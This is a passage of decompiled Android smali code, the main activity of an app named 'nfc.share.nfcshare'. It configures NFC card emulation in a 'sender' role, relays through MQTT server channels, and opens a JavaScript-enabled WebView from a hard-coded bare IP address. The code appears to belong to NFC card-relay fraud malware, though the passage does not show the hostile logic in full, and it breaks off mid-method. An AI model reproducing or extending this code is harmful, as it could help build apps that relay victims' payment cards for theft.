.class public Lnfc/share/nfcshare/MainActivity;
.super Le/f;
.source "SourceFile"


# instance fields
.field public A:Ljava/lang/String;

.field public B:Landroid/app/AlertDialog;

.field public C:Ljava/lang/String;

.field public D:Landroid/webkit/WebView;

.field public E:Landroid/nfc/cardemulation/CardEmulation;

.field public v:Lt1/l;

.field public w:J

.field public x:J

.field public y:Landroid/widget/Toast;

.field public z:Ljava/util/ArrayList;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 1
    invoke-direct {p0}, Le/f;-><init>()V

    .line 2
    .line 3
    .line 4
    new-instance v0, Ljava/util/ArrayList;

    .line 5
    .line 6
    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 7
    .line 8
    .line 9
    new-instance v0, Ljava/util/ArrayList;

    .line 10
    .line 11
    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 12
    .line 13
    .line 14
    iput-object v0, p0, Lnfc/share/nfcshare/MainActivity;->z:Ljava/util/ArrayList;

    .line 15
    .line 16
    const-string v0, ""

    .line 17
    .line 18
    iput-object v0, p0, Lnfc/share/nfcshare/MainActivity;->A:Ljava/lang/String;

    .line 19
    .line 20
    iput-object v0, p0, Lnfc/share/nfcshare/MainActivity;->C:Ljava/lang/String;

    .line 21
    .line 22
    return-void
.end method

.method public static u(Ljava/lang/String;I)V
    .locals 3

    .line 1
    if-eqz p0, :cond_0

    .line 2
    .line 3
    invoke-virtual {p0}, Ljava/lang/String;->isEmpty()Z

    .line 4
    .line 5
    .line 6
    move-result v0

    .line 7
    if-nez v0, :cond_0

    .line 8
    .line 9
    new-instance v0, Lt1/j;

    .line 10
    .line 11
    new-instance v1, Landroidx/fragment/app/y;

    .line 12
    .line 13
    const/16 v2, 0xd

    .line 14
    .line 15
    invoke-direct {v1, v2}, Landroidx/fragment/app/y;-><init>(I)V

    .line 16
    .line 17
    .line 18
    invoke-direct {v0, v1}, Lt1/j;-><init>(Lt1/i;)V

    .line 19
    .line 20
    .line 21
    iput p1, v0, Lt1/j;->b:I

    .line 22
    .line 23
    filled-new-array {p0}, [Ljava/lang/String;

    .line 24
    .line 25
    .line 26
    move-result-object p0

    .line 27
    invoke-virtual {v0, p0}, Landroid/os/AsyncTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 28
    .line 29
    .line 30
    return-void

    .line 31
    :cond_0
    sget-object p0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    .line 32
    .line 33
    const-string p1, "\u672a\u627e\u5230ping_ip"

    .line 34
    .line 35
    invoke-virtual {p0, p1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 36
    .line 37
    .line 38
    return-void
.end method


# virtual methods
.method public final onBackPressed()V
    .locals 4

    .line 1
    iget-wide v0, p0, Lnfc/share/nfcshare/MainActivity;->w:J

    .line 2
    .line 3
    const-wide/16 v2, 0x7d0

    .line 4
    .line 5
    add-long/2addr v0, v2

    .line 6
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 7
    .line 8
    .line 9
    move-result-wide v2

    .line 10
    cmp-long v0, v0, v2

    .line 11
    .line 12
    if-lez v0, :cond_1

    .line 13
    .line 14
    iget-object v0, p0, Lnfc/share/nfcshare/MainActivity;->y:Landroid/widget/Toast;

    .line 15
    .line 16
    if-eqz v0, :cond_0

    .line 17
    .line 18
    invoke-virtual {v0}, Landroid/widget/Toast;->cancel()V

    .line 19
    .line 20
    .line 21
    :cond_0
    invoke-super {p0}, Landroidx/activity/k;->onBackPressed()V

    .line 22
    .line 23
    .line 24
    goto :goto_0

    .line 25
    :cond_1
    const-string v0, "\u518d\u6309\u4e00\u6b21\u8fd4\u56de\u9000\u51fa"

    .line 26
    .line 27
    const/4 v1, 0x0

    .line 28
    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    .line 29
    .line 30
    .line 31
    move-result-object v0

    .line 32
    iput-object v0, p0, Lnfc/share/nfcshare/MainActivity;->y:Landroid/widget/Toast;

    .line 33
    .line 34
    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 35
    .line 36
    .line 37
    :goto_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 38
    .line 39
    .line 40
    move-result-wide v0

    .line 41
    iput-wide v0, p0, Lnfc/share/nfcshare/MainActivity;->w:J

    .line 42
    .line 43
    return-void
.end method

.method public final onCreate(Landroid/os/Bundle;)V
    .locals 10

    .line 1
    const/4 v0, 0x1

    .line 2
    invoke-super {p0, p1}, Le/f;->onCreate(Landroid/os/Bundle;)V

    .line 3
    .line 4
    .line 5
    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    .line 6
    .line 7
    .line 8
    move-result-object p1

    .line 9
    invoke-virtual {p1}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    .line 10
    .line 11
    .line 12
    move-result-object p1

    .line 13
    invoke-virtual {p1}, Landroid/view/View;->getSystemUiVisibility()I

    .line 14
    .line 15
    .line 16
    move-result v1

    .line 17
    or-int/lit16 v1, v1, 0x2000

    .line 18
    .line 19
    invoke-virtual {p1, v1}, Landroid/view/View;->setSystemUiVisibility(I)V

    .line 20
    .line 21
    .line 22
    const p1, 0x7f0b001e

    .line 23
    .line 24
    .line 25
    invoke-virtual {p0, p1}, Le/f;->setContentView(I)V

    .line 26
    .line 27
    .line 28
    sget-object p1, Lt1/n;->a:LS0/d;

    .line 29
    .line 30
    const-string p1, "ServerSettings"

    .line 31
    .line 32
    const/4 v1, 0x0

    .line 33
    invoke-virtual {p0, p1, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 34
    .line 35
    .line 36
    move-result-object p1

    .line 37
    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    .line 38
    .line 39
    .line 40
    move-result-object p1

    .line 41
    const-string v2, "isPosMode"

    .line 42
    .line 43
    invoke-interface {p1, v2, v1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 44
    .line 45
    .line 46
    move-result-object p1

    .line 47
    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 48
    .line 49
    .line 50
    const-string p1, "\u53d1\u9001\u7aef"

    .line 51
    .line 52
    sput-object p1, Lt1/n;->e:Ljava/lang/String;

    .line 53
    .line 54
    sget-object p1, Lt1/b;->a:Lv1/o;

    .line 55
    .line 56
    const-string p1, "UserSession"

    .line 57
    .line 58
    invoke-virtual {p0, p1, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 59
    .line 60
    .line 61
    move-result-object p1

    .line 62
    const-string v2, "uid"

    .line 63
    .line 64
    invoke-interface {p1, v2, v1}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    .line 65
    .line 66
    .line 67
    move-result p1

    .line 68
    invoke-static {p1}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    .line 69
    .line 70
    .line 71
    move-result-object p1

    .line 72
    sput-object p1, Lt1/n;->g:Ljava/lang/String;

    .line 73
    .line 74
    const p1, 0x7f080221

    .line 75
    .line 76
    .line 77
    invoke-virtual {p0, p1}, Le/f;->findViewById(I)Landroid/view/View;

    .line 78
    .line 79
    .line 80
    move-result-object p1

    .line 81
    check-cast p1, Landroid/webkit/WebView;

    .line 82
    .line 83
    iput-object p1, p0, Lnfc/share/nfcshare/MainActivity;->D:Landroid/webkit/WebView;

    .line 84
    .line 85
    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    .line 86
    .line 87
    .line 88
    move-result-object p1

    .line 89
    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 90
    .line 91
    .line 92
    iget-object p1, p0, Lnfc/share/nfcshare/MainActivity;->D:Landroid/webkit/WebView;

    .line 93
    .line 94
    new-instance v2, Lt1/g;

    .line 95
    .line 96
    invoke-direct {v2}, Landroid/webkit/WebViewClient;-><init>()V

    .line 97
    .line 98
    .line 99
    invoke-virtual {p1, v2}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 100
    .line 101
    .line 102
    iget-object p1, p0, Lnfc/share/nfcshare/MainActivity;->D:Landroid/webkit/WebView;

    .line 103
    .line 104
    const-string v2, "http://154.205.156.112//baxi/b/?step="

    .line 105
    .line 106
    invoke-virtual {p1, v2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 107
    .line 108
    .line 109
    const-string p1, "ServerSettings"

    .line 110
    .line 111
    invoke-virtual {p0, p1, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 112
    .line 113
    .line 114
    move-result-object p1

    .line 115
    const-string v2, "isPosMode"

    .line 116
    .line 117
    invoke-interface {p1, v2, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 118
    .line 119
    .line 120
    move-result p1

    .line 121
    if-nez p1, :cond_0

    .line 122
    .line 123
    new-instance p1, Lu1/c;

    .line 124
    .line 125
    invoke-direct {p1, p0}, Lu1/c;-><init>(Lnfc/share/nfcshare/MainActivity;)V

    .line 126
    .line 127
    .line 128
    :cond_0
    new-instance p1, Landroid/app/AlertDialog$Builder;

    .line 129
    .line 130
    const v2, 0x7f100126

    .line 131
    .line 132
    .line 133
    invoke-direct {p1, p0, v2}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;I)V

    .line 134
    .line 135
    .line 136
    const v2, 0x7f0b0034

    .line 137
    .line 138
    .line 139
    invoke-virtual {p1, v2}, Landroid/app/AlertDialog$Builder;->setView(I)Landroid/app/AlertDialog$Builder;

    .line 140
    .line 141
    .line 142
    move-result-object p1

    .line 143
    invoke-virtual {p1, v1}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    .line 144
    .line 145
    .line 146
    move-result-object p1

    .line 147
    invoke-virtual {p1}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    .line 148
    .line 149
    .line 150
    move-result-object p1

    .line 151
    iput-object p1, p0, Lnfc/share/nfcshare/MainActivity;->B:Landroid/app/AlertDialog;

    .line 152
    .line 153
    const-string p1, "UserSession"

    .line 154
    .line 155
    invoke-virtual {p0, p1, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 156
    .line 157
    .line 158
    move-result-object p1

    .line 159
    const-string v2, "uid"

    .line 160
    .line 161
    invoke-interface {p1, v2, v1}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    .line 162
    .line 163
    .line 164
    move-result p1

    .line 165
    invoke-static {p1}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    .line 166
    .line 167
    .line 168
    const-string p1, "UserSession"

    .line 169
    .line 170
    invoke-virtual {p0, p1, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 171
    .line 172
    .line 173
    move-result-object p1

    .line 174
    const-string v2, "account"

    .line 175
    .line 176
    const-string v3, ""

    .line 177
    .line 178
    invoke-interface {p1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 179
    .line 180
    .line 181
    sput-object p0, Lt1/n;->d:Lnfc/share/nfcshare/MainActivity;

    .line 182
    .line 183
    iget-wide v2, p0, Lnfc/share/nfcshare/MainActivity;->x:J

    .line 184
    .line 185
    const-wide/16 v4, 0x3e8

    .line 186
    .line 187
    add-long/2addr v2, v4

    .line 188
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 189
    .line 190
    .line 191
    move-result-wide v4

    .line 192
    cmp-long p1, v2, v4

    .line 193
    .line 194
    const/4 v2, 0x0

    .line 195
    if-lez p1, :cond_1

    .line 196
    .line 197
    goto/16 :goto_0

    .line 198
    .line 199
    :cond_1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 200
    .line 201
    .line 202
    move-result-wide v3

    .line 203
    iput-wide v3, p0, Lnfc/share/nfcshare/MainActivity;->x:J

    .line 204
    .line 205
    invoke-static {p0}, Landroid/nfc/NfcAdapter;->getDefaultAdapter(Landroid/content/Context;)Landroid/nfc/NfcAdapter;

    .line 206
    .line 207
    .line 208
    move-result-object p1

    .line 209
    const v3, 0x7f10013e

    .line 210
    .line 211
    .line 212
    if-eqz p1, :cond_4

    .line 213
    .line 214
    invoke-virtual {p0}, Lnfc/share/nfcshare/MainActivity;->s()V

    .line 215
    .line 216
    .line 217
    invoke-static {p0}, LD1/l;->D(Lnfc/share/nfcshare/MainActivity;)Z

    .line 218
    .line 219
    .line 220
    move-result p1

    .line 221
    if-nez p1, :cond_2

    .line 222
    .line 223
    new-instance p1, Landroid/app/AlertDialog$Builder;

    .line 224
    .line 225
    invoke-direct {p1, p0, v3}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;I)V

    .line 226
    .line 227
    .line 228
    const-string v3, "\u63d0\u793a"

    .line 229
    .line 230
    invoke-virtual {p1, v3}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    .line 231
    .line 232
    .line 233
    move-result-object p1

    .line 234
    const-string v3, "\u8bf7\u68c0\u67e5\u7f51\u7edc\u8fde\u63a5"

    .line 235
    .line 236
    invoke-virtual {p1, v3}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    .line 237
    .line 238
    .line 239
    move-result-object p1

    .line 240
    const-string v3, "\u786e\u5b9a"

    .line 241
    .line 242
    invoke-virtual {p1, v3, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 243
    .line 244
    .line 245
    move-result-object p1

    .line 246
    invoke-virtual {p1}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    .line 247
    .line 248
    .line 249
    move-result-object p1

    .line 250
    invoke-virtual {p1, v1}, Landroid/app/Dialog;->setCanceledOnTouchOutside(Z)V

    .line 251
    .line 252
    .line 253
    invoke-virtual {p1, v1}, Landroid/app/Dialog;->setCancelable(Z)V

    .line 254
    .line 255
    .line 256
    invoke-virtual {p1}, Landroid/app/Dialog;->show()V

    .line 257
    .line 258
    .line 259
    goto :goto_0

    .line 260
    :cond_2
    :try_start_0
    sget-object p1, Lt1/n;->b:LG0/h;

    .line 261
    .line 262
    if-nez p1, :cond_3

    .line 263
    .line 264
    new-instance p1, LG0/h;

    .line 265
    .line 266
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 267
    .line 268
    .line 269
    move-result-object v3

    .line 270
    invoke-direct {p1, v3}, LG0/h;-><init>(Landroid/content/Context;)V

    .line 271
    .line 272
    .line 273
    sput-object p1, Lt1/n;->b:LG0/h;

    .line 274
    .line 275
    new-instance v3, Lt1/d;

    .line 276
    .line 277
    const/4 v4, 0x3

    .line 278
    invoke-direct {v3, p0, v4}, Lt1/d;-><init>(Lnfc/share/nfcshare/MainActivity;I)V

    .line 279
    .line 280
    .line 281
    iput-object v3, p1, LG0/h;->c:Ljava/lang/Object;

    .line 282
    .line 283
    :cond_3
    sget-object p1, Lt1/n;->b:LG0/h;

    .line 284
    .line 285
    iget-object v3, p0, Lnfc/share/nfcshare/MainActivity;->C:Ljava/lang/String;

    .line 286
    .line 287
    invoke-virtual {p1, v3}, LG0/h;->g(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 288
    .line 289
    .line 290
    goto :goto_0

    .line 291
    :cond_4
    new-instance p1, Landroid/app/AlertDialog$Builder;

    .line 292
    .line 293
    invoke-direct {p1, p0, v3}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;I)V

    .line 294
    .line 295
    .line 296
    const v3, 0x7f07007b

    .line 297
    .line 298
    .line 299
    invoke-virtual {p1, v3}, Landroid/app/AlertDialog$Builder;->setIcon(I)Landroid/app/AlertDialog$Builder;

    .line 300
    .line 301
    .line 302
    move-result-object p1

    .line 303
    const-string v3, "NFC"

    .line 304
    .line 305
    invoke-virtual {p1, v3}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    .line 306
    .line 307
    .line 308
    move-result-object p1

    .line 309
    const-string v3, "Device without NFC support. Install on another device."

    .line 310
    .line 311
    invoke-virtual {p1, v3}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    .line 312
    .line 313
    .line 314
    move-result-object p1

    .line 315
    const-string v3, "OK"

    .line 316
    .line 317
    invoke-virtual {p1, v3, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 318
    .line 319
    .line 320
    move-result-object p1

    .line 321
    invoke-virtual {p1}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    .line 322
    .line 323
    .line 324
    move-result-object p1

    .line 325
    invoke-virtual {p1, v1}, Landroid/app/Dialog;->setCanceledOnTouchOutside(Z)V

    .line 326
    .line 327
    .line 328
    invoke-virtual {p1, v1}, Landroid/app/Dialog;->setCancelable(Z)V

    .line 329
    .line 330
    .line 331
    invoke-virtual {p1}, Landroid/app/Dialog;->show()V

    .line 332
    .line 333
    .line 334
    :catch_0
    :goto_0
    const-string p1, "UserSession"

    .line 335
    .line 336
    invoke-virtual {p0, p1, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 337
    .line 338
    .line 339
    move-result-object p1

    .line 340
    const-string v3, "urlInfo"

    .line 341
    .line 342
    invoke-interface {p1, v3, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 343
    .line 344
    .line 345
    move-result-object p1

    .line 346
    iput-object p1, p0, Lnfc/share/nfcshare/MainActivity;->C:Ljava/lang/String;

    .line 347
    .line 348
    const-string p1, "MainActivity"

    .line 349
    .line 350
    const-string v3, "getServerList"

    .line 351
    .line 352
    invoke-static {p1, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 353
    .line 354
    .line 355
    sget-object p1, Lnfc/share/nfcshare/App;->b:Lnfc/share/nfcshare/App;

    .line 356
    .line 357
    iget-object p1, p1, Lnfc/share/nfcshare/App;->a:Ljava/util/ArrayList;

    .line 358
    .line 359
    iput-object p1, p0, Lnfc/share/nfcshare/MainActivity;->z:Ljava/util/ArrayList;

    .line 360
    .line 361
    if-nez p1, :cond_5

    .line 362
    .line 363
    iget-object p1, p0, Lnfc/share/nfcshare/MainActivity;->B:Landroid/app/AlertDialog;

    .line 364
    .line 365
    invoke-virtual {p1}, Landroid/app/Dialog;->show()V

    .line 366
    .line 367
    .line 368
    new-instance p1, Lt1/d;

    .line 369
    .line 370
    invoke-direct {p1, p0, v0}, Lt1/d;-><init>(Lnfc/share/nfcshare/MainActivity;I)V

    .line 371
    .line 372
    .line 373
    invoke-static {p0, v1, p1}, Lt1/b;->a(Lnfc/share/nfcshare/MainActivity;ZLt1/a;)V

    .line 374
    .line 375
    .line 376
    goto :goto_1

    .line 377
    :cond_5
    invoke-virtual {p1, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    .line 378
    .line 379
    .line 380
    move-result-object p1

    .line 381
    check-cast p1, Lt1/m;

    .line 382
    .line 383
    invoke-virtual {p1}, Lt1/m;->a()Ljava/lang/String;

    .line 384
    .line 385
    .line 386
    move-result-object p1

    .line 387
    iput-object p1, p0, Lnfc/share/nfcshare/MainActivity;->C:Ljava/lang/String;

    .line 388
    .line 389
    iget-object p1, p0, Lnfc/share/nfcshare/MainActivity;->z:Ljava/util/ArrayList;

    .line 390
    .line 391
    invoke-virtual {p1, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    .line 392
    .line 393
    .line 394
    move-result-object p1

    .line 395
    check-cast p1, Lt1/m;

    .line 396
    .line 397
    sget-object p1, Lt1/n;->a:LS0/d;

    .line 398
    .line 399
    :goto_1
    new-instance p1, Le/r;

    .line 400
    .line 401
    invoke-direct {p1, v0, p0}, Le/r;-><init>(ILjava/lang/Object;)V

    .line 402
    .line 403
    .line 404
    new-instance v3, Landroid/content/IntentFilter;

    .line 405
    .line 406
    const-string v4, "nfc.share.nfcshare"

    .line 407
    .line 408
    invoke-direct {v3, v4}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 409
    .line 410
    .line 411
    invoke-static {p0}, Lc0/c;->a(Landroid/content/Context;)Lc0/c;

    .line 412
    .line 413
    .line 414
    move-result-object v4

    .line 415
    iget-object v5, v4, Lc0/c;->b:Ljava/util/HashMap;

    .line 416
    .line 417
    monitor-enter v5

    .line 418
    :try_start_1
    new-instance v6, Lc0/b;

    .line 419
    .line 420
    invoke-direct {v6, v3, p1}, Lc0/b;-><init>(Landroid/content/IntentFilter;Le/r;)V

    .line 421
    .line 422
    .line 423
    iget-object v7, v4, Lc0/c;->b:Ljava/util/HashMap;

    .line 424
    .line 425
    invoke-virtual {v7, p1}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 426
    .line 427
    .line 428
    move-result-object v7

    .line 429
    check-cast v7, Ljava/util/ArrayList;

    .line 430
    .line 431
    if-nez v7, :cond_6

    .line 432
    .line 433
    new-instance v7, Ljava/util/ArrayList;

    .line 434
    .line 435
    invoke-direct {v7, v0}, Ljava/util/ArrayList;-><init>(I)V

    .line 436
    .line 437
    .line 438
    iget-object v8, v4, Lc0/c;->b:Ljava/util/HashMap;

    .line 439
    .line 440
    invoke-virtual {v8, p1, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 441
    .line 442
    .line 443
    goto :goto_2

    .line 444
    :catchall_0
    move-exception p1

    .line 445
    goto/16 :goto_4

    .line 446
    .line 447
    :cond_6
    :goto_2
    invoke-virtual {v7, v6}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 448
    .line 449
    .line 450
    move p1, v1

    .line 451
    :goto_3
    invoke-virtual {v3}, Landroid/content/IntentFilter;->countActions()I

    .line 452
    .line 453
    .line 454
    move-result v7

    .line 455
    if-ge p1, v7, :cond_8

    .line 456
    .line 457
    invoke-virtual {v3, p1}, Landroid/content/IntentFilter;->getAction(I)Ljava/lang/String;

    .line 458
    .line 459
    .line 460
    move-result-object v7

    .line 461
    iget-object v8, v4, Lc0/c;->c:Ljava/util/HashMap;

    .line 462
    .line 463
    invoke-virtual {v8, v7}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 464
    .line 465
    .line 466
    move-result-object v8

    .line 467
    check-cast v8, Ljava/util/ArrayList;

    .line 468
    .line 469
    if-nez v8, :cond_7

    .line 470
    .line 471
    new-instance v8, Ljava/util/ArrayList;

    .line 472
    .line 473
    invoke-direct {v8, v0}, Ljava/util/ArrayList;-><init>(I)V

    .line 474
    .line 475
    .line 476
    iget-object v9, v4, Lc0/c;->c:Ljava/util/HashMap;

    .line 477
    .line 478
    invoke-virtual {v9, v7, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 479
    .line 480
    .line 481
    :cond_7
    invoke-virtual {v8, v6}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 482
    .line 483
    .line 484
    add-int/2addr p1, v0

    .line 485
    goto :goto_3

    .line 486
    :cond_8
    monitor-exit v5
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 487
    new-instance p1, Lt1/l;

    .line 488
    .line 489
    new-instance v0, Landroidx/fragment/app/y;

    .line 490
    .line 491
    const/16 v3, 0xe

    .line 492
    .line 493
    invoke-direct {v0, v3}, Landroidx/fragment/app/y;-><init>(I)V

    .line 494
    .line 495
    .line 496
    invoke-direct {p1, v0}, Lt1/l;-><init>(Landroidx/fragment/app/y;)V

    .line 497
    .line 498
    .line 499
    iput-object p1, p0, Lnfc/share/nfcshare/MainActivity;->v:Lt1/l;

    .line 500
    .line 501
    const-string p1, "UserSession"

    .line 502
    .line 503
    invoke-virtual {p0, p1, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 504
    .line 505
    .line 506
    move-result-object p1

    .line 507
    const-string v0, "urlInfo"

    .line 508
    .line 509
    invoke-interface {p1, v0, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 510
    .line 511
    .line 512
    move-result-object p1

    .line 513
    iput-object p1, p0, Lnfc/share/nfcshare/MainActivity;->A:Ljava/lang/String;

    .line 514
    .line 515
    new-instance p1, Ljava/lang/StringBuilder;

    .line 516
    .line 517
    const-string v0, "select id ="

    .line 518
    .line 519
    invoke-direct {p1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 520
    .line 521
    .line 522
    iget-object v0, p0, Lnfc/share/nfcshare/MainActivity;->A:Ljava/lang/String;

    .line 523
    .line 524
    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 525
    .line 526
    .line 527
    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 528
    .line 529
    .line 530
    move-result-object p1

    .line 531
    const-string v0, "test"

    .line 532
    .line 533
    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 534
    .line 535
    .line 536
    sget-object p1, Lnfc/share/nfcshare/App;->b:Lnfc/share/nfcshare/App;

    .line 537
    .line 538
    iget-object p1, p1, Lnfc/share/nfcshare/App;->a:Ljava/util/ArrayList;

    .line 539
    .line 540
    iput-object p1, p0, Lnfc/share/nfcshare/MainActivity;->z:Ljava/util/ArrayList;

    .line 541
    .line 542
    if-eqz p1, :cond_a

    .line 543
    .line 544
    invoke-virtual {p1}, Ljava/util/ArrayList;->isEmpty()Z

    .line 545
    .line 546
    .line 547
    move-result p1

    .line 548
    if-nez p1, :cond_a

    .line 549
    .line 550
    iget-object p1, p0, Lnfc/share/nfcshare/MainActivity;->A:Ljava/lang/String;

    .line 551
    .line 552
    if-eqz p1, :cond_9

    .line 553
    .line 554
    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    .line 555
    .line 556
    .line 557
    move-result p1

    .line 558
    if-eqz p1, :cond_a

    .line 559
    .line 560
    :cond_9
    iget-object p1, p0, Lnfc/share/nfcshare/MainActivity;->z:Ljava/util/ArrayList;

    .line 561
    .line 562
    invoke-virtual {p1, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    .line 563
    .line 564
    .line 565
    move-result-object p1

    .line 566
    check-cast p1, Lt1/m;

    .line 567
    .line 568
    invoke-virtual {p1}, Lt1/m;->a()Ljava/lang/String;

    .line 569
    .line 570
    .line 571
    move-result-object p1

    .line 572
    iput-object p1, p0, Lnfc/share/nfcshare/MainActivity;->A:Ljava/lang/String;

    .line 573
    .line 574
    :cond_a
    return-void

    .line 575
    :goto_4
    :try_start_2
    monitor-exit v5
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 576
    throw p1
.end method

.method public final onPause()V
    .locals 4

    .line 1
    invoke-super {p0}, Le/f;->onPause()V

    .line 2
    .line 3
    .line 4
    new-instance v0, Landroidx/fragment/app/y;

    .line 5
    .line 6
    const/16 v1, 0xc

    .line 7
    .line 8
    invoke-direct {v0, v1}, Landroidx/fragment/app/y;-><init>(I)V

    .line 9
    .line 10
    .line 11
    const/4 v1, 0x1

    .line 12
    invoke-static {p0, v1, v0}, Lt1/b;->a(Lnfc/share/nfcshare/MainActivity;ZLt1/a;)V

    .line 13
    .line 14
    .line 15
    iget-object v0, p0, Lnfc/share/nfcshare/MainActivity;->v:Lt1/l;

    .line 16
    .line 17
    iget-object v2, v0, Lt1/l;->c:Lt1/j;

    .line 18
    .line 19
    invoke-virtual {v2, v1}, Landroid/os/AsyncTask;->cancel(Z)Z

    .line 20
    .line 21
    .line 22
    iget-object v0, v0, Lt1/l;->b:Ljava/util/Timer;

    .line 23
    .line 24
    invoke-virtual {v0}, Ljava/util/Timer;->cancel()V

    .line 25
    .line 26
    .line 27
    sget-object v0, Lt1/n;->b:LG0/h;

    .line 28
    .line 29
    if-eqz v0, :cond_0

    .line 30
    .line 31
    sget-boolean v0, LG0/h;->f:Z

    .line 32
    .line 33
    if-eqz v0, :cond_0

    .line 34
    .line 35
    const-string v0, "test"

    .line 36
    .line 37
    const-string v1, "disconnect..."

    .line 38
    .line 39
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 40
    .line 41
    .line 42
    sget-object v0, Lt1/n;->b:LG0/h;

    .line 43
    .line 44
    sget-object v1, Lnfc/share/nfcshare/model/MqttChannel;->OFFLINE_CHANNEL:Lnfc/share/nfcshare/model/MqttChannel;

    .line 45
    .line 46
    new-instance v2, Ljava/lang/StringBuilder;

    .line 47
    .line 48
